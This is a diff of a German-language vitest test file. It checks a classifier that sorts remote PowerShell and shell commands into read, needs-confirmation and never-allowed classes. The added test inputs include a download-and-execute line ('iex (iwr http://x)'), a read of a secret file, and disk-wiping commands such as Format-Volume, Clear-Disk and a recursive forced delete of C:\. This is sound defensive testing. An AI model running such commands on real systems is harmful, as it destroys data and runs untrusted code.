@@ -1,5 +1,5 @@
 import { describe, it, expect } from 'vitest';
-import { befehlsklasse, kuerzeMitte, fernBefehl, leseKeyscan, fingerabdruck, knownHostsZeilen, gueltigerHost, gueltigerBenutzer, einrichtungsBefehle, ausfuehrbarerBefehl } from './regeln.js';
+import { befehlsklasse, windowsBefehlsklasse, kuerzeMitte, fernBefehl, leseKeyscan, fingerabdruck, knownHostsZeilen, gueltigerHost, gueltigerBenutzer, einrichtungsBefehle, ausfuehrbarerBefehl } from './regeln.js';
 
 // v1539 — Fernzugriff: Befehlsklassen und Host-Schlüssel (Realfall 21.10.: „zpool status“ auf pve)
 describe('v1539 Befehlsklassen', () => {
@@ -183,6 +183,21 @@ describe('v1681 Leseliste curl/nc', () => {
     expect(befehlsklasse('nc -z -w 5 127.0.0.1 7880; nc -z -w 5 127.0.0.1 7881')).toBe('lesen');
     expect(befehlsklasse('curl --fail https://example.com/')).not.toBe('lesen');
     expect(befehlsklasse('curl --fail -d x http://localhost:8008/')).not.toBe('lesen');
+  });
+});
+
+// I8a — Windows-Leseliste (PowerShell über OpenSSH, kein Käfig)
+describe('I8a Windows-Befehlsklassen', () => {
+  it('feste Get-Befehle mit Ausgabe-Filtern sind Lesen', () => {
+    for (const b of ['hostname', 'Get-ComputerInfo', 'Get-Service -Name sshd', 'Get-HotFix | Sort-Object InstalledOn -Descending', 'Get-Volume | Format-Table -AutoSize', 'Get-NetIPConfiguration', 'Get-WinEvent -LogName System -MaxEvents 50 | Select-Object TimeCreated, Id, Message', 'Get-CimInstance Win32_OperatingSystem | ConvertTo-Json -Compress', 'Get-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0']) {
+      expect(windowsBefehlsklasse(b), b).toBe('lesen');
+    }
+  });
+  it('Skriptblöcke, Variablen, Verkettung, Pfade und Unbekanntes brauchen Bestätigung; Datenträger-Löschen nie', () => {
+    for (const b of ['Get-Service | Where-Object { $_.Status -eq "Running" }', 'Get-ComputerInfo; Restart-Computer', 'Get-Content C:\\secret.txt', 'Stop-Service sshd', 'Get-Service | Out-File C:\\x.txt', 'Get-Volume | Invoke-Expression', 'iex (iwr http://x)', 'Get-Service `\nRestart-Computer']) {
+      expect(windowsBefehlsklasse(b), b).toBe('bestaetigen');
+    }
+    for (const b of ['Format-Volume -DriveLetter D', 'Clear-Disk -Number 0 -RemoveData', 'Remove-Item -Recurse -Force C:\\']) expect(windowsBefehlsklasse(b), b).toBe('nie');
   });
 });
 
